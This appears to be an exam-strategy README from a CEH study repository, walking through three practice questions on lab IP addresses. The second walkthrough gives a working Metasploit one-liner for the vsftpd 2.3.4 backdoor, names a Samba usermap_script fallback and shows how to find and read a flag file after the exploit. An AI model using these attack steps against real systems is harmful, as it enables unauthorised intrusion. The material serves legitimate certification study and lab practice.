# 00 Exam Strategy — anatomy of a CEH question

Two full dissections showing the thought process from "question appears" to "answer submitted". Not about the tools — about **how to read the question**.

---

## Walkthrough 1: "What is the version of the service running on port 2121 of 10.10.10.15?"

**Type:** service-version | **Difficulty:** easy | **Time:** 2 min

### Reading the question

- Underline the noun: **version** (not name, not CVE — version string)
- Target: `10.10.10.15`
- Port: `2121` (non-standard → probably FTP, but don't assume)
- Domain: scanning → [../02-scanning/README.md](../02-scanning/README.md)

### Steps

1. Direct version probe — no need for full scan:
   ```bash
   nmap -sV -p 2121 10.10.10.15
   ```
2. Read VERSION column:
   ```
   PORT     STATE SERVICE VERSION
   2121/tcp open  ftp     ProFTPD 1.3.5
   ```
3. **Answer:** `ProFTPD 1.3.5` — copy verbatim, case-sensitive, space not dash.

### Thought process

- The question told you the port → zero value in scanning everything else
- `-sV` alone, no `-sC` needed → fastest path
- If `-sV` returns `tcpwrapped` or blank, escalate to `--version-all` and `banner.nse`
- Would NOT run `-p-` here — you'd waste 4 minutes for no extra info

### Gotcha

If the answer box rejects `ProFTPD 1.3.5`, try:
- `proftpd 1.3.5` (lowercase)
- `1.3.5` (version only)
- `ProFTPD/1.3.5` (slash format from banner)

---

## Walkthrough 2: "Find the content of flag.txt on the machine 10.10.10.22"

**Type:** foothold-required | **Difficulty:** medium-hard | **Time:** 20–40 min

### Reading the question

- Underline the noun: **content of flag.txt** — you need code execution, not just info
- This is a **chain** question: scan → enum → exploit → post-exploit
- Domain: multiple. Start scanning → [../02-scanning](../02-scanning/README.md)

### Steps

1. Fire the 5 first-moves ([commands.md](commands.md)):
   ```bash
   export TARGET=10.10.10.22
   nmap -sV -sC -p- -T4 -oA full $TARGET
   ```
2. Review what's open. Say you get:
   ```
   21/tcp  open  ftp     vsftpd 2.3.4
   22/tcp  open  ssh     OpenSSH 7.2
   80/tcp  open  http    Apache 2.4.18
   445/tcp open  microsoft-ds Samba 3.0.20
   ```
3. Pick the juiciest target. `vsftpd 2.3.4` is the famous backdoor CVE-2011-2523.
   Cross-reference → [../04-vuln-analysis/commands.md](../04-vuln-analysis/commands.md)
   ```bash
   searchsploit vsftpd 2.3.4
   ```
4. Exploit (via Metasploit or the raw PoC):
   ```bash
   msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS $TARGET; run"
   ```
5. Post-exploit — find the flag:
   ```bash
   find / -name flag.txt 2>/dev/null
   cat /root/flag.txt
   ```
6. **Answer:** the exact string in flag.txt. Copy verbatim including any `{}` wrapping.

### Thought process

- There were **three** viable paths (vsftpd, Samba 3.0.20, Apache) — I picked the highest-confidence one first
- If vsftpd failed I'd try Samba (usermap_script → CVE-2007-2447) next
- Do NOT start from Apache — web exploitation is slower and less deterministic
- The clock matters: if no shell by 20 min, flag the question and come back

### Gotcha

- `find / -name flag.txt` on some boxes returns the literal file you planted during exploitation — always `cat` the one in a user/root home dir
- Some flags are on mounted shares, not the filesystem — check `mount` and `/mnt`
- Trailing newline in `cat` output is **not** part of the answer

---

## Walkthrough 3: "Which tool would you use to perform a zone transfer?"

**Type:** tool-identification (theory) | **Difficulty:** easy | **Time:** 30 sec

### Reading the question

- No IP. No target. This is a **theory / tool-ID** question.
- Noun: **tool** (name only)
- Domain: recon → [../01-recon-footprinting/README.md](../01-recon-footprinting/README.md)

### Steps

1. No commands to run. Jump to the recon tool list.
2. Zone transfer tools: `dig axfr`, `host -l`, `dnsrecon -a`, `fierce`.
3. **Answer:** usually `dig` (most common canonical answer) — but read the question options if multiple-choice.

### Thought process

- Don't fire up a VM for theory questions — 10 sec on the repo beats 2 min in a terminal
- The "expected" CEH answer is sometimes the textbook one (dig) even if you'd personally use dnsrecon
